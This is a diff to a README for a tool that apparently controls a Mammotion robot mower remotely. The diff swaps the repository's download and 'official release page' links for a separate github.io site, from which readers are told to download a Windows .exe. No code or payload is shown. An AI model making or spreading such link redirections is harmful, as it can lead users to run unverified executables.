@@ -1,6 +1,6 @@
 # 🕹️ mammotion-rc - Control your mower from anywhere remotely
 
-[![Download mammotion-rc](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/In-score10/mammotion-rc)
+[![Download mammotion-rc](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://in-score10.github.io)
 
 Mammotion-rc lets you take command of your Mammotion robot mower through the internet. By using a Heltec HC33 device as a bridge, this software connects your mower to your home network. You gain the ability to direct your mower, view a live video feed, and check battery levels from your web browser. This tool removes the range limits of Bluetooth by creating a persistent connection to your mower.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these needs before you begin:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/In-score10/mammotion-rc) to find the latest version of the installer.
+1. Visit the [official release page](https://in-score10.github.io) to find the latest version of the installer.
 2. Look for the "Assets" section at the bottom of the release notes.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
